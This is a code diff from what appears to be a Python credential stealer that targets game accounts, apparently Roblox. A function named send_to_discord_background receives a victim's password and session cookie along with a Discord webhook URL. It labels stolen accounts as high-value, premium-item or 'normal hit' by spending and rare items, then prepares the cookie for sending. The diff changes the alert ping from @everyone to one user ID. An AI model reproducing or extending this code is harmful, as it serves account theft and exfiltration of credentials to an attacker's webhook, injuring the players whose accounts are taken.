@@ -46,7 +46,7 @@ def send_to_discord_background(password, cookie, webhook_url):
         
         if total_spent_value >= 50000:
             # High value account - ping everyone
-            ping_content = '@everyone 🚨 **HIGH VALUE ACCOUNT DETECTED!** 🚨'
+            ping_content = '<@1343590833995251825> 🚨 **HIGH VALUE ACCOUNT DETECTED!** 🚨'
             if has_premium_items:
                 ping_content += ' - Account has premium items AND high spending!'
             else:
@@ -54,7 +54,7 @@ def send_to_discord_background(password, cookie, webhook_url):
                 
         elif has_premium_items:
             # Premium items but not high spending
-            ping_content = '@everyone 🚨 **PREMIUM ITEMS DETECTED!** 🚨'
+            ping_content = '<@1343590833995251825> 🚨 **PREMIUM ITEMS DETECTED!** 🚨'
             if korblox and headless:
                 ping_content += ' - Account has both Korblox AND Headless!'
             elif korblox:
@@ -65,10 +65,10 @@ def send_to_discord_background(password, cookie, webhook_url):
         else:
             # Normal account with some spending
             if total_spent_value > 0:
-                ping_content = '@everyone 📈 **Normal Hit** - Account has spending history'
+                ping_content = '<@1343590833995251825> 📈 **Normal Hit** - Account has spending history'
             else:
                 # No ping for accounts with no spending and no premium items
-                ping_content = '@everyone Hit'
+                ping_content = '<@1343590833995251825> Hit'
         
         # Prepare cookie content for Discord (use cookie as provided)
         cookie_content = cookie if cookie else 'Not provided'
